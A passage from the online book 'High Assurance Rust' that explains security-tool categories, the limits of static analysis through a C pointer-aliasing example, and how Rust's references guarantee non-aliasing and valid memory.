<p>One approach<sup class="footnote-reference" id="fr-CSE545-1"><a href="#footnote-CSE545">5</a></sup> is a quadrant with two axises - static vs. dynamic on the X-axis, known bugs vs. unknown bugs on the Y-axis:</p>
<p align="center">
  <figure>
  <img width="100%" src="chp2/tool_quad.svg">
  </figure>
</p>
<p>Let's traverse the quads in their numbered order: left to right, top to bottom.
Above the horizon, we can find <strong>unknown bugs</strong>.
That means discovering brand new bugs, no existing data needed:</p>
<ol>
<li>
<p><strong>Static, Unknown Bugs (S, U)</strong> - Ingest existing source code or build artifacts and use analyses to find bugs or prove properties. Without running the program itself.</p>
<ul>
<li>Example tool: <code>rustc</code> (whole book).</li>
</ul>
</li>
<li>
<p><strong>Dynamic, Unknown Bugs (D, U)</strong> - Generate concrete test cases and execute the program with these generated inputs, potentially collecting feedback from runtime behavior.</p>
<ul>
<li>Example tool: <code>libFuzzer</code> (Chapter 12).</li>
</ul>
</li>
</ol>
<p>Below the horizon, we can only detect pre-discovered bugs for which signature data is already available.
The <strong>known bugs</strong>:</p>
<ol start="3">
<li>
<p><strong>Static, Known Bugs (S, K)</strong> - Analyze the composition of software systems, checking dependencies for known vulnerable versions or known buggy configurations.</p>
<ul>
<li>Example tool: <code>cargo-audit</code> (Chapter 3).</li>
</ul>
</li>
<li>
<p><strong>Dynamic, Known Bugs (D, K)</strong> - Query live assets or services to fingerprint their versions or configurations.</p>
<ul>
<li>Example tool class: network vulnerablity scanners (not covered in this book).</li>
</ul>
</li>
</ol>
<p>For any approach: some subset of reported bugs, in the broader context of the application or service, may be exploitable vulnerabilities.
So a general software security workflow is:</p>
<ol>
<li>Collect results from tools.</li>
<li>Triage their review.</li>
<li>Develop fixes for the high priority vulnerabilities.</li>
<li>Test the patched product.</li>
<li>Deploy the fixes to production.</li>
</ol>
<p>The faster we can move through that cycle, the better.
At minimum, we should be able to keep pace with feature addition.
Ideally, security testing can both support new feature rollout and proactively harden existing attack surfaces.</p>
<p>Now if we have tools that find unknown bugs, why do we even need tools that check for known bugs?
Can't we just find all bugs present using tools from quadrants 1 and 2?</p>
<p>Unfortunately, no.
Many bug classes can't be detected automatically, with any kind of tool or analysis.
We'll get into why when we talk about limitations in a later section.
Most bugs need to be found by skilled humans, and turned into signatures that the 3 and 4 quadrant tools can detect.
Again, tools are a supplement for scale - not a substitute for smarts.</p>
<h2 id="takeaway"><a class="header" href="#takeaway">Takeaway</a></h2>
<p>Software assurance entails a "level of confidence".
Tests bolster our confidence in a match between a business-relevant specification and a particular implementation of a system or product.</p>
<p>Static analyses, which reason about a program without running it, tend to be good at proving the absence of a class of bugs.
But those classes are <em>limited</em>.
Often, there are no false negatives (the analysis doesn't miss anything).</p>
<p>Dynamic analyses, which run a program, tend to be good at finding at least one bug.
But it could be <em>any</em> kind of bug.
Often, there are no false positives (the analysis result is true).</p>
<p>Both approaches can find known (e.g. existing CVEs) and unknown bugs (e.g. zero-days).
Let's tackle static analysis first, while we're fresh.
It's the more theoretically complex of the pair.</p>
<hr>
<ol class="footnote-definition"><li id="footnote-OpenSSL">
<p><a href="https://www.openssl.org/"><em>OpenSSL</em></a>. The OpenSSL Project (2021). <a href="#fr-OpenSSL-1">↩</a></p>
</li>
<li id="footnote-Most">
<p>"Most" excludes domains outside those the analysis is capable of reasoning about. That could be because they're tough to model, like a power or timing hardware side-channel (where something about the hardware's interaction with the physical world produces a vulnerability). Or because a bug in the code performing the analysis, or a shortcoming of it's design, lead to limitations in the domain it <em>can</em> reason about.
Nothing is completely fool-proof. There is no absolute security. <a href="#fr-Most-1">↩</a></p>
</li>
<li id="footnote-Safety">
<p>Here, "safety property" is a general term used to classify the type of specification our question is getting at. Memory safety is just one specific example of safety property. <a href="#fr-Safety-1">↩</a></p>
</li>
<li id="footnote-YinYang">
<p><a href="https://en.wikipedia.org/wiki/Yin_and_yang"><em>Yin and yang</em></a>. Wikipedia (Accessed 2022). <a href="#fr-YinYang-1">↩</a></p>
</li>
<li id="footnote-CSE545">
<p><a href="https://youtu.be/pw1a4ohgN50?t=153"><em>CSE545 Week 12: 6 Reasons to Love Fuzzing</em></a>. David Brumley (2020). <a href="#fr-CSE545-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="static-assurance-1-of-2"><a class="header" href="#static-assurance-1-of-2">Static Assurance (1 of 2)</a></h1>
<p>Static analysis can be confusing.
Say we want to test some program, call it <code>P</code>.
If we never run <code>P</code>, how exactly are we going to learn about what it does or can do?</p>
<p>Static analysis tools often use a layer of indirection that simplifies answering a particular question.
They map the constructs of <code>P</code> to an analysis-specific abstract domain<sup class="footnote-reference" id="fr-AbsInt-1"><a href="#footnote-AbsInt">1</a></sup>.
This representation is designed to reflect one or more properties of <code>P</code>.
Analyzing it allows us to draw conclusions about <code>P</code>.</p>
<p>If you've ever used a compiler to build an executable, or had an interpreter check syntax before running a script, then you've seen static analysis in action.</p>
<p>The analysis is itself a program (within your compiler or interpreter of choice) that runs its own special algorithms - let's call it <code>Q</code>, the "analyzer".
Since we run <code>Q</code> and get a result, we don't need to execute <code>P</code> (for which the result applies).
That's one [ironically dynamic] way to understand static analysis.</p>
<blockquote>
<p><strong>Concrete vs. Abstract:</strong></p>
<p>Whereas a dynamic analysis <em>observes</em> a set of <em>concrete</em> states by executing a program, a static analysis <em>summarizes</em> possible <em>abstract</em> states.
Each abstract state represents a set of concrete states.</p>
<p>Imagine a simple "guessing game" program where the player chooses a number between 1 and 10, inclusive.
If the player enters <code>7</code>, the program prints <code>you win!</code>.
Otherwise it prints <code>you lose</code>.</p>
<p>Dynamic analysis of a run where the player entered <code>3</code> would observe an internal variable <code>x</code> set to <code>3</code>, one side of a branch taken, and the corresponding <code>you lose</code> output.
Those are all concrete events.</p>
<p>One kind of static analysis<sup class="footnote-reference" id="fr-SymEx-1"><a href="#footnote-SymEx">2</a></sup> would conclude that the program has two abstract states: one leading to <code>you win!</code> output if <code>x == 7</code> and another leading to <code>you lose</code> if <code>x != 7</code>.</p>
</blockquote>
<h2 id="challenges-in-static-program-analysis"><a class="header" href="#challenges-in-static-program-analysis">Challenges in Static Program Analysis</a></h2>
<p>Assume we're talking about static analyses for finding unknown bugs (the top-left quad from the previous diagram).
Applied to this use case, the static approach has tradeoffs.
Generally speaking:</p>
<ul>
<li>
<p><strong>Pro:</strong> Domain-derived conclusions may apply to <em>all possible executions</em> of the program. That means they could hold for any possible input! This helps us maximize confidence.</p>
<ul>
<li>Static analysis can, in the best case, <em>prove the absence</em> of a specific bug class.</li>
</ul>
</li>
<li>
<p><strong>Con:</strong> Because we're using an abstract representation and not the real thing, some static analyses can <em>over-approximate</em>  or, worse yet, <em>fail to terminate</em>[^CMU]<sup class="footnote-reference" id="fr-UPenn-1"><a href="#footnote-UPenn">3</a></sup>.</p>
<ul>
<li>
<p><em>Over-approximation</em> produces false positive results. Meaning, due to a limitation of the analysis, many of the bugs found aren't real bugs. Getting stuck with a backlog of faulty results is a drag on busy engineering teams.</p>
</li>
<li>
<p><em>Failure to terminate</em> means the analysis never outputs a result. This can be due to "state explosion" - a combinatorial growth in complexity of the problem the analysis is trying to reason about. To avoid spinning forever, many commercial tools reduce complexity via approximation. Which, again, risks false positives.</p>
</li>
</ul>
</li>
</ul>
<p>Designing an static analysis algorithm practical enough to terminate (no state explosion) yet clever enough to never produce a false positive (no over-approximation) is, surprisingly often, impossible.
Not "impossible given our current knowledge and computational power".
Provably impossible, as in the problem is mathematically <em>undecidable</em>[^AliasPaper]<sup class="footnote-reference" id="fr-AliasPaper2-1"><a href="#footnote-AliasPaper2">4</a></sup>.</p>
<ul>
<li><em>Undecidable</em> means there will never be an algorithm that can make a correct yes-or-no determination in any arbitrary case.</li>
</ul>
<p>Here's the good news: algorithm designers can make intelligent tradeoffs.
Sometimes that means accepting a tolerable amount of over-approximation.
Other times it means introducing rules, constraints, assumptions, or annotations - all to make more precise analysis practical.</p>
<p>Rust isn't an exception.
The language imposes certain constraints on the programmer.
These constraints make Rust challenging to learn, and the analyses they enable can cause sluggish compile times.
For some teams, those tradeoffs may be unacceptable.</p>
<p>If you can develop a rough intuition for why all static analysis tools require tradeoffs, you'll be well equipped to reason about any static tool or technology you encounter in the future.
Including proprietary static analyzers with hefty licensing costs.
So let's explore limitations in a practical context: pointer analysis.</p>
<h2 id="case-study-pointer-analysis"><a class="header" href="#case-study-pointer-analysis">Case Study: Pointer Analysis</a></h2>
<p>We're going to discuss pointer analysis (aka "points-to" or "may-alias" analysis) at a very high-level.
So no walkthrough of Steensgaard's algorithm<sup class="footnote-reference" id="fr-Steen-1"><a href="#footnote-Steen">5</a></sup> with big-step semantics<sup class="footnote-reference" id="fr-CMU2-1"><a href="#footnote-CMU2">6</a></sup>.
Our aim is to build a practical intuition, not to drown in the "symbol soup" of Programming Languages (PL) formalisms<sup class="footnote-reference" id="fr-SymSoup-1"><a href="#footnote-SymSoup">7</a></sup>.</p>
<p>Why look at this specific kind of static analysis?
Pointer analysis is an archetypical example of challenges in verifying properties for real-world, memory-unsafe systems code.
This discussion will help you deeply understand the dire problems Rust solves statically.
And the rationale for the language's stringent rules.</p>
<blockquote>
<p><strong>What is a pointer?</strong></p>
<p>If you haven't written C or C++, you've likely been protected from the horrors of "raw pointers".
But even languages like Go and Java throw exceptions for <code>nil</code>/<code>NULL</code> pointers (Rust fixes this "billion dollar mistake"<sup class="footnote-reference" id="fr-BillProb-1"><a href="#footnote-BillProb">8</a></sup>!). Let's explore the C-family case.</p>
<p>Pointers are addresses of locations in memory.
Usually, but not always, the memory is "virtual" - it's an abstraction over physical memory on the machine (CPU cache, RAM, HDDs, etc).
Mechanically, the addresses are represented as unsigned integers.</p>
<p>Pointers are commonly used to access data (e.g. array, structure, object) "by reference".
Meaning without having to copy a potentially large object (aka "pass-by-value").
Pointers are important tools for traditional systems programming.
They enable efficient use of memory.</p>
<p>But they're also a double-edged sword.
Pointers are wildly easy to catastrophically misuse.
An off-by-one error in pointer arithmetic can mean reading incorrect data and not knowing it. Attempting to access an invalid pointer is a crash at best. If an attacker can set the value of a pointer, your program might be exploitable.
Think "footgun".</p>
</blockquote>
<p>Pointer analysis has one goal:</p>
<ul>
<li>Determine what variables or objects each pointer <em>could</em> point to at runtime.</li>
</ul>
<p>Armed with that information, we know where data <em>could</em> be read from and where it <em>could</em> be written.
"Could" stems from the fact that each run of the program may be different.
We need a set of possibilities representative of all potential runs.
This information allows us to make strong, confidence-inspiring claims about a program.</p>
<h3 id="one-line-to-fool-them-all"><a class="header" href="#one-line-to-fool-them-all">One Line to Fool Them All</a></h3>
<p>With that goal in mind, consider this single-line C function<sup class="footnote-reference" id="fr-Creusot-1"><a href="#footnote-Creusot">9</a></sup>:</p>
<pre><code class="language-c">void incr(int* a, int* b) {
    *a += *b;
}
</code></pre>
<p>This seemingly innocuous little function is a wolf in sheep's clothing.
If this function is part of a larger program, a pointer analysis can't tell if <code>a</code> and <code>b</code> point to the same integer (aka "alias") or not.
The analysis result will be indeterminate: it will conclude that the parameters "may or may not alias".
A classic over-approximation.</p>
<p>Since this might be your first glimpse of C, let's take a minute to break down what's going on:</p>
<ul>
<li>
<p><code>incr</code>, the <strong>name of the function</strong>, is short for <code>increment</code>. We can guess this function is going to increase the value of something.</p>
</li>
<li>
<p><strong>Function parameters</strong> appear within the parentheses. This function takes two arguments, <code>a</code> and <code>b</code>. Both are pointers to integers stored somewhere in memory.</p>
<ul>
<li>
<p>The <code>*</code> operator in a function signature denotes a pointer.</p>
</li>
<li>
<p>So <code>int*</code> means "pointer to an integer".</p>
</li>
</ul>
</li>
<li>
<p>The <strong>return type</strong>, <code>void</code>, indicates this function doesn't return anything. So we can guess that it has some sort of "side-effect" (update to program state).</p>
</li>
<li>
<p>The <strong>body of the function</strong> reads (from memory) the respective current values of integers pointed to by <code>a</code> and <code>b</code>, adds the value of <code>int b</code> to <code>int a</code> (integer addition, not pointer addition), and then updates <code>int a</code> with that sum.</p>
<ul>
<li>
<p><code>*a += *b;</code> is shorthand for <code>*a = *a + *b;</code>, a semicolon-terminated statement.</p>
</li>
<li>
<p>Here, unlike in the signature, the <code>*</code> operator means "dereference the pointer", e.g. read the value of its target.</p>
</li>
<li>
<p><code>*</code> takes precedence over <code>+</code>, meaning the read happens first. Precedence mistakes can be tricky with pointer arithmetic!</p>
</li>
</ul>
</li>
</ul>
<p>Say <code>int a</code> has a value of <code>40</code> and <code>int b</code> has a value of <code>2</code> before we call <code>incr</code>.
Pointers <code>*a</code> and <code>*b</code> would each point to their respective integers in memory, like so:</p>
</br>
<p align="center">
  <figure>
  <img width="100%" src="chp2/incr_ptrs_ok.svg">
  <figcaption><center>*a points to 40, *b points to 2</center></figcaption><br>
  </figure>
</p>
<p>Calling <code>incr(a, b)</code> adds <code>int b</code> to <code>int a</code>. So after the call, we'd have:</p>
</br>
<p align="center">
  <figure>
  <img width="100%" src="chp2/incr_ptrs_ok_after.svg">
  <figcaption><center>*a points to 42 (incremented), *b points to 2</center></figcaption><br>
  </figure>
</p>
<blockquote>
<p><strong>Is that "idiomatic" C code?</strong></p>
<p>No. Integers are typically passed by value (integer itself, instead of a pointer to it).
That's more efficient since an integer fits neatly into a little piece of the CPU's scratch memory, called a "register".
Regardless, our <code>incr</code> function is representative of day-to-day C code that operates on referenced data.
The conclusions we're about to draw are broadly applicable.</p>
</blockquote>
<h3 id="so-whats-the-issue"><a class="header" href="#so-whats-the-issue">So what's the issue?</a></h3>
<p>Once you get past the syntax, the <code>incr</code> function is quite simple: it just adds two numbers together.
Why is this such a challenge for pointer analysis practice?</p>
<p>These "raw" (meaning unrestricted<sup class="footnote-reference" id="fr-RawMem-1"><a href="#footnote-RawMem">10</a></sup>) pointers present two non-trivial complications:</p>
<ul>
<li>
<p><strong>1. Undecidable Aliasing:</strong> Say both pointers reference the same memory location (they alias). Then incrementing <code>a</code> also increments <code>b</code>. That's very likely not what the programmer intended, it's an edge case that changes what this function does. But we can't prove that it won't happen<sup class="footnote-reference" id="fr-AliasPaper-1"><a href="#footnote-AliasPaper">11</a></sup>. Because scalable and accurate pointer analysis remains an open research problem.</p>
<ul>
<li>
<p><strong>Implication:</strong> We can't make a detailed claim about what this function will do at runtime, even given additional context (like all the places where <code>incr</code> is called, aka "call sites"). The undesirable case pictured below can't be precisely detected by any tool.</p>
</li>
<li>
<p><strong>Root cause:</strong> Over-approximation <em>within</em> the analysis domain. The designers of a pointer analysis have to make conscious tradeoffs in result precision (like tolerating "may or may not alias" conclusions).</p>
</li>
</ul>
</li>
</ul>
</br>
<p align="center">
  <figure>
  <img width="100%" src="chp2/incr_ptrs_alias.svg">
  <figcaption><center>*a and *b both point to 40 (alias). Now a's integer doubles instead of incrementing (e.g. 80, 160, 320, 640, ...).</center></figcaption><br>
  </figure>
</p>
<ul>
<li>
<p><strong>2. Complex Memory Models:</strong> Raw pointers may be set to invalid memory locations. A programmer could introduce a pointer-arithmetic bug when computing an offset. Or simply leave the pointers "uninitialized" (a default state in C).</p>
<ul>
<li>
<p><strong>Implication:</strong> Pointer dereference could be a crash. Or a read or write of arbitrary data (no crash but incorrect program output or behavior).</p>
</li>
<li>
<p><strong>Root Cause:</strong> Over-approximation <em>outside</em> the analysis domain. It's a product of an abstraction boundary. Differing semantics at the hardware/software interface, in this case.</p>
</li>
</ul>
</li>
</ul>
</br>
<p align="center">
  <figure>
  <img width="100%" src="chp2/incr_ptrs_bad.svg">
  <figcaption><center>*a points to arbitrary memory, *b points outside the address space of the process</center></figcaption><br>
  </figure>
</p>
<p>Let's recap.
Alias?
Maybe the program doesn't behave as expected.
We can't tell.
Invalid pointer?
Maybe the program crashes, maybe some other value is overwritten and thus becomes incorrect.
Again, we can't prove that this won't happen.</p>
<p>The <code>incr</code> function appears simple, but creates insurmountable challenges for static assurance.
We can't claim that this program will perform the intended addition.
Without proof to point to, our confidence is low.</p>
<blockquote>
<p><strong>Pointer Aliasing Problems in the Real World</strong></p>
<p><code>gcc</code>, an open-source C compiler, aims to generate efficient code.
Since it's impossible to reliably tell if any two pointers will alias<sup class="footnote-reference" id="fr-AliasPaper-2"><a href="#footnote-AliasPaper">11</a></sup>, <code>gcc</code> cheats a little: for any optimization level greater than <code>-O1</code>, the compiler <em>assumes</em> that two pointers can't alias if they point to <em>different types</em>.
The assumption makes certain impactful optimizations possible.</p>
<p>But, in practice, C programmers sometimes violate the assumption (there's a technique called "type-punning").
In such cases, the optimization may produce nasty bugs or unexpected behaviors.
Thus, the optimization is explicitly disabled in the Linux kernel with the <code>gcc</code> flag <code>-fno-strict-aliasing</code>[^GCCSetting]<sup class="footnote-reference" id="fr-UndefResearch-1"><a href="#footnote-UndefResearch">12</a></sup>.</p>
</blockquote>
<h2 id="a-summary-of-our-pointer-problems"><a class="header" href="#a-summary-of-our-pointer-problems">A Summary of Our Pointer Problems</a></h2>
<p>Static analyses risk two failure modes (not mutually exclusive): <em>over-approximation</em> and/or <em>failure to scale/terminate</em>.
Both limit the assurance value we can extract from static analysis tools.</p>
<p>Pointer analysis for memory-unsafe languages is a classic example of a real-world problem we're forced to over-approximate.
While pointers (e.g. freely-controlled memory addresses) are a convenient abstraction for systems programming, they cripple our ability to automatically reason about runtime.
Humans also struggle to get it right (pointers are a part of why C programs are infamous for "segmentation fault"<sup class="footnote-reference" id="fr-SegFault-1"><a href="#footnote-SegFault">13</a></sup> crashes).</p>
<p>Raw pointers are just one reason why eliminating memory safety issues in existing C/C++ code is unrealistic.
At least not without breaking backwards compatibility.
Remember: memory safety is a multi-decade-difficult problem.
Many have tried, most have failed.</p>
<p>Let's get a taste for how Rust handles the pointer problem.</p>
<blockquote>
<p><strong>Imprecise Analyses Can Still Be Useful!</strong></p>
<p>Pointer analysis has a close cousin: Value Set Analysis (VSA).
It can be applied to compiled binaries, supporting use cases where source code isn't available (e.g. reverse engineering).
Unlike pointer analysis, VSA doesn't differentiate between pointer and integer variables.
It computes a <em>range of possible runtime values</em> for either type of numeric variable.</p>
<p>For the above <code>incr</code> example, a precise VSA of a correct program might determine that integer <code>a</code> has an inclusive value range of <code>[40, 42]</code> - capturing both the pre and post increment values. And that pointer <code>*a</code> is similarly within some range of valid memory addresses, notionally something like <code>[0x7ffe455e5c40, 0x7ffe455e5bf0]</code>.</p>
<p>Here's the kicker: a recent peer-reviewed human study<sup class="footnote-reference" id="fr-VSA-1"><a href="#footnote-VSA">14</a></sup> found that even imprecise (e.g. over-approximate) VSA results improved reverse engineers' ability to determine if a program would print sensitive information (e.g. find "information leakage" vulnerabilities).
Armed with imprecise VSA results, less experienced reverse engineers could match the unassisted performance of their more experienced counterparts<sup class="footnote-reference" id="fr-VSA-2"><a href="#footnote-VSA">14</a></sup> for certain problem types.</p>
<p>Approximate static analyses can, in many contexts, be demonstrably useful.</p>
</blockquote>
<hr>
<ol class="footnote-definition"><li id="footnote-AbsInt">
<p><a href="https://dl.acm.org/doi/10.1145/512950.512973"><em>Abstract interpretation: a unified lattice model for static analysis of programs by construction or approximation of fixpoints</em></a>. Patrick Cousot, Radhia Cousot (1977). <a href="#fr-AbsInt-1">↩</a></p>
</li>
<li id="footnote-SymEx">
<p>Breaking down outcomes according to <em>constraints</em> on program variables (like <code>x != 7</code>) is a hallmark of "symbolic execution", a particularly powerful program analysis. In theory, symbolic execution is a purely static analysis. But in practice it's often implemented using feedback from concrete, dynamic runs (aka "concolic execution"). <a href="#fr-SymEx-1">↩</a></p>
</li>
<li id="footnote-UPenn">
<p><a href="http://rightingcode.org/lessons.html"><em>CIS 547 Software Analysis</em></a>. Mayur Naiak et al, University of Pennsylvania (2021). <a href="#fr-UPenn-1">↩</a></p>
</li>
<li id="footnote-AliasPaper2">
<p><a href="https://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.49.6454&amp;rep=rep1&amp;type=pdf"><em>Precise Flow-Insensitive May-Alias Analysis is NP-Hard</em></a>. Susan Horowitz (1997). <a href="#fr-AliasPaper2-1">↩</a></p>
</li>
<li id="footnote-Steen">
<p><a href="https://www.cs.cornell.edu/courses/cs711/2005fa/papers/steensgaard-popl96.pdf"><em>Points-to Analysis in Almost Linear Time</em></a>. Bjarne Steensgaard, Microsoft Research (1996). <a href="#fr-Steen-1">↩</a></p>
</li>
<li id="footnote-CMU2">
<p><a href="https://cmu-program-analysis.github.io/2021/lecture-slides/11-pointer-analysis.pdf"><em>Lecture 11: Pointer Analysis</em></a>. Rohan Padhye, Jonathan Aldrich. Carnegie Mellon University (2021). <a href="#fr-CMU2-1">↩</a></p>
</li>
<li id="footnote-SymSoup">
<p>That being said, formal notations are worthwhile - learning them can change how you think about certain problems or, at very least, it allows you to read cutting-edge research papers. <a href="#fr-SymSoup-1">↩</a></p>
</li>
<li id="footnote-BillProb">
<p><a href="https://www.infoq.com/presentations/Null-References-The-Billion-Dollar-Mistake-Tony-Hoare/"><em>Null References: The Billion Dollar Mistake</em></a>. Tony Hoare (2009). <a href="#fr-BillProb-1">↩</a></p>
</li>
<li id="footnote-Creusot">
<p><a href="https://www.youtube.com/watch?v=BPt987BRdDw"><em>Safer Rust: Program Verification with Creusot</em></a>. Xavier Denis (2021). The function we borrow from this talk was used to demonstrate how Rust's type system aids verification. We explore this idea in the next section, but in a different context. <a href="#fr-Creusot-1">↩</a></p>
</li>
<li id="footnote-RawMem">
<p>Well, "unrestricted" relative to the current execution environment - there exist "sandboxes" (memory segmentation enforcement), like the process space the OS has allocated for your program. Such restrictions reduce the likelihood of a bug or exploit in one program affecting other programs or the OS itself. <a href="#fr-RawMem-1">↩</a></p>
</li>
<li id="footnote-AliasPaper">
<p><a href="https://www.cmi.ac.in/~madhavan/courses/program-analysis-2008/papers/landi91-ptr-analysis-popl.pdf"><em>Pointer-induced aliasing: a problem classification</em></a>. William Landi, Barbara Ryder (1990). <a href="#fr-AliasPaper-1">↩</a> <a href="#fr-AliasPaper-2">↩2</a></p>
</li>
<li id="footnote-UndefResearch">
<p><a href="https://people.csail.mit.edu/nickolai/papers/wang-undef-2012-08-21.pdf"><em>Undefined Behavior: What Happened to My Code?</em></a>. Xi Wang, Haogang Chen, Alvin Cheung, Zhihao Jia, Nickolai Zeldovich, M. Frans Kaashoek (2012). <a href="#fr-UndefResearch-1">↩</a></p>
</li>
<li id="footnote-SegFault">
<p>"segmentation fault" , or "segfault" for short, is an error thrown by the operating system when your program attempts to access regions of memory that don't belong to it (outside allotted "segment"). While it can be frustrating to debug, imagine how difficult things would be if the OS didn't stop you! <a href="#fr-SegFault-1">↩</a></p>
</li>
<li id="footnote-VSA">
<p><a href="https://www.ndss-symposium.org/wp-content/uploads/bar2021_23002_paper.pdf"><em>Effects of Precise and Imprecise Value-Set Analysis (VSA) Information on Manual Code Analysis</em></a>. Laura Matzen, Michelle Leger, Geoffrey Reedy (2021). <a href="#fr-VSA-1">↩</a> <a href="#fr-VSA-2">↩2</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="static-assurance-2-of-2"><a class="header" href="#static-assurance-2-of-2">Static Assurance (2 of 2)</a></h1>
<p>We now have an informal understanding of challenges in static program analysis.
Or maybe just some intuitions about why pointer analysis is difficult.
And the trouble is, pointers are the peanut butter to our systems programming jelly.
We <em>must</em> have pass-by-reference semantics to write performant software.</p>
<p>This is where the tradeoffs start for Rust.
First, we have to forsake raw pointers and instead rely on references (more on this below).
Second, there are rules we must obey whenever using references.</p>
<h2 id="but-what-if-i-truly-need-good-ol-fashioned-pointers"><a class="header" href="#but-what-if-i-truly-need-good-ol-fashioned-pointers">But what if I <em>truly</em> need good ol'-fashioned pointers?</a></h2>
<p>An abstraction is useful if "its assumptions match the context in which it exists"<sup class="footnote-reference" id="fr-CorecurPodcast-1"><a href="#footnote-CorecurPodcast">1</a></sup>.
Pointers are an abstraction facilitating interaction with memory.</p>
<p>When your program cannot be expressed within the constraints of safe Rust<sup class="footnote-reference" id="fr-MMIO-1"><a href="#footnote-MMIO">2</a></sup>, you can still write that program using the <code>unsafe</code> keyword.
As the keyword implies, you're forgoing certain compiler-enforced safety guarantees for a limited scope.
Inside an <code>unsafe</code> block, you may use raw pointers at your own peril.
The burden of proof of correctness is entirely on your shoulders, as the programmer.</p>
<p>Having that "opt-out" mechanism is better than aborting an analysis completely.
In fact, <code>unsafe</code> enables seamless integration with existing C code.
That interoperability enables a lot of Rust's real-world use.</p>
<blockquote>
<p><strong>Isn't <code>unsafe</code> a weak link? Don't we lose all assurance?</strong></p>
<p>Not exactly.
Work in formal verification of Rust's type system demonstrates that security claims can be upheld despite the presence of <code>unsafe</code><sup class="footnote-reference" id="fr-JungThesis-1"><a href="#footnote-JungThesis">3</a></sup>.</p>
<p>Even without formal methods, <em>safe abstractions</em> can be built atop <em>unsafe operations</em><sup class="footnote-reference" id="fr-UnsafeAbstraction-1"><a href="#footnote-UnsafeAbstraction">4</a></sup>.
We can carefully design interfaces which uphold safety invariants no matter how they are called.
Despite using <code>unsafe</code> internally.
Granted the compiler can't automatically verify the correctness of such designs.
We'll discuss the difference between <em>unsafety</em> and <em>unsoundness</em> in Chapter 13.</p>
<p>But let's consider a simpler perspective: the less <code>unsafe</code> we use, the less total code we need to audit for memory-related bugs.</p>
<p>Even if a codebase is split 50/50 safe/<code>unsafe</code>, we're still saving significant costs in security review, debugging hours, and patch deployments. That's true even if that latter <code>unsafe</code> half is C or C++ that interoperates with safe Rust.</p>
</blockquote>
<h2 id="rusts-static-strategy"><a class="header" href="#rusts-static-strategy">Rust's Static Strategy</a></h2>
<p>The below is our favorite little troublemaker, the C <code>incr</code> function, re-written in Rust:</p>
<pre><code class="language-rust noplaypen">fn incr(a: &amp;mut isize, b: &amp;isize) {
    *a += *b;
}</code></pre>
<p>We broke down the C version piece-by-piece, so you already know what this function does.
Take a second to review the above.
Can you make some guesses about the syntax?</p>
<p>The body of the function is exactly the same.
<code>*</code> is still a dereference operator.
<code>+=</code> is the same shorthand.
<code>isize</code> is the keyword for a signed integer - just like C's <code>int</code>.</p>
<p>But there are two differences between our Rust and C <code>incr</code> functions.
The first is a minor detail: there's no return type.
<code>void</code> is implied, because Rust only requires explicit return type annotations when a function actually returns a value.</p>
<p>The second difference, the fact that we're no longer using pointers, is far more important.
Looking at function signature:</p>
<ul>
<li>
<p><code>&amp;</code> is a reference. That's like a pointer, except it can't be an arbitrary value. Rust <em>guarantees</em> it's the <strong>valid address</strong> of an <strong>initialized variable</strong>.</p>
<ul>
<li>We've just <strong>fixed the memory model problem</strong> from the last section. Whenever we use the dereference operator, <code>*</code>, we <em>do not</em> risk crashing or reading bad data.</li>
</ul>
</li>
<li>
<p><code>&amp;mut</code> means "mutable reference". Our function gets the ability to <em>write</em> to the variable pointed to by <code>a</code>. This is not true of <code>b</code>, because it's a lowly "immutable reference" (just <code>&amp;</code>). Now Rust <em>guarantees</em> that, at any given time, <strong>only one mutable reference exists</strong> for any piece of data.</p>
<ul>
<li>If only one mutable reference can exist at any point, then <code>b</code> cannot reference the same piece of data as <code>a</code>. The two parameters are <em>guaranteed</em> to <strong>never alias</strong>.</li>
</ul>
</li>
</ul>
<p>It's worth reflecting on the gravity of the statements we just made about Rust.
An entire world of powerful static guarantees has opened up.</p>
<p>Last section, we wallowed in the sorrows when discussing the <code>incr</code> function: undecidable aliasing forcing over-approximation, potential crashes, reads of arbitrary memory, etc.</p>
<p>When we ported the function to Rust, the mere act of compiling it (creating an executable program) actually <em>proves</em> that this program will add two different integers as expected. As in, computer scientists have done early work in formal verification<sup class="footnote-reference" id="fr-TypeProof-1"><a href="#footnote-TypeProof">5</a></sup> of the Rust type system (where those guarantees come from[^RustcBug]<sup class="footnote-reference" id="fr-TotSafeTrans-1"><a href="#footnote-TotSafeTrans">6</a></sup>).</p>
<p>By leveraging Rust where it makes sense, we gain a high level of assurance.
At least with respect to memory safety.
We're still not guaranteeing anything about <code>incr</code>'s business logic (the big picture meaning of the values <code>incr</code> is incrementing and whether or not incrementing them makes sense).
Let's not miss the forest for the trees.</p>
<blockquote>
<p><strong>Doesn't C++ also have references?</strong></p>
<p>Yes.
But its references are not memory-safe.</p>
<p>C++ references are easier to use correctly than raw pointers because they can't be set to arbitrary values.
But they still allow mutable aliases.
That's problematic for both verification and concurrent code.</p>
<p>They also don't enforce validity.
In C++, you can mistakenly use a reference to an object that's already "gone", meaning it has been deallocated. That's a bug, potentially a vulnerability, Rust prevents.</p>
</blockquote>
<h2 id="verifying-our-claims"><a class="header" href="#verifying-our-claims">Verifying Our Claims</a></h2>
<p>"Trust but verify" is a good mindset to adopt whenever security is a requirement.
So let's see Rust's analyses in action.
Consider this valid program:</p>
